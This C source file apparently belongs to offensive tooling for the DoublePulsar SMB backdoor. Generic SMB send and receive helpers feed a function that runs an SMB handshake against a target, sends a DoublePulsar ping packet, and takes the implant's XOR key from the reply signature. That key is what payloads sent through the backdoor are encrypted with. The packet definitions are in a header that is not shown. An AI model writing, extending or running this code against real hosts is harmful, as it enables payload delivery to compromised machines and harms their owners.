#define _GNU_SOURCE
#include "config.h"

#include <errno.h>
#include <stdint.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <unistd.h>

extern int smb_connect(const char *ip, int port);

static int
smb_send_all(int fd, const void *buffer, size_t length)
{
    const unsigned char *p = buffer;

    while (length != 0) {
        ssize_t n = send(fd, p, length, 0);
        if (n < 0) {
            if (errno == EINTR)
                continue;
            return -1;
        }
        if (n == 0)
            return -1;

        p += (size_t)n;
        length -= (size_t)n;
    }

    return 0;
}

static int
smb_recv_all(int fd, void *buffer, size_t length)
{
    unsigned char *p = buffer;

    while (length != 0) {
        ssize_t n = recv(fd, p, length, 0);
        if (n < 0) {
            if (errno == EINTR)
                continue;
            return -1;
        }
        if (n == 0)
            return -1;

        p += (size_t)n;
        length -= (size_t)n;
    }

    return 0;
}

static unsigned char *
smb_read_frame(int fd, size_t *frame_length)
{
    unsigned char header[4];
    unsigned char *frame;
    size_t payload_length;

    if (smb_recv_all(fd, header, sizeof(header)) < 0)
        return NULL;

    payload_length = ((size_t)header[1] << 16) |
                     ((size_t)header[2] << 8) |
                     (size_t)header[3];

    frame = malloc(sizeof(header) + payload_length);
    if (frame == NULL)
        return NULL;

    for (size_t i = 0; i < sizeof(header); ++i)
        frame[i] = header[i];

    if (payload_length != 0 &&
        smb_recv_all(fd, frame + sizeof(header), payload_length) < 0) {
        free(frame);
        return NULL;
    }

    *frame_length = sizeof(header) + payload_length;
    return frame;
}

unsigned int
DoublePulsarXORKeyCalculator(const char *ip, int port)
{
    int fd = smb_connect(ip, port);
    unsigned int key = 0;
    const unsigned char *packets[] = {
        SMB_NEGOTIATE_PKT,
        SMB_SESSION_SETUP_PKT,
        SMB_TREE_CONNECT_PKT,
        DP_PING_PKT
    };
    const size_t packet_lengths[] = {
        sizeof(SMB_NEGOTIATE_PKT),
        sizeof(SMB_SESSION_SETUP_PKT),
        sizeof(SMB_TREE_CONNECT_PKT),
        sizeof(DP_PING_PKT)
    };

    if (fd < 0)
        return 0;

    for (size_t i = 0; i < sizeof(packets) / sizeof(packets[0]); ++i) {
        size_t frame_length;
        unsigned char *frame;

        if (smb_send_all(fd, packets[i], packet_lengths[i]) < 0)
            goto done;

        frame = smb_read_frame(fd, &frame_length);
        if (frame == NULL)
            goto done;

        if (i == 3) {
            size_t start = (size_t)SMB_RESP_SIGNATURE_START;

            if (SMB_RESP_SIGNATURE_END < SMB_RESP_SIGNATURE_START + 3 ||
                start + 3 >= frame_length) {
                free(frame);
                goto done;
            }

            key = ((unsigned int)frame[start] << 24) |
                  ((unsigned int)frame[start + 1] << 16) |
                  ((unsigned int)frame[start + 2] << 8) |
                  (unsigned int)frame[start + 3];
        }

        free(frame);
    }

done:
    close(fd);
    return key;
}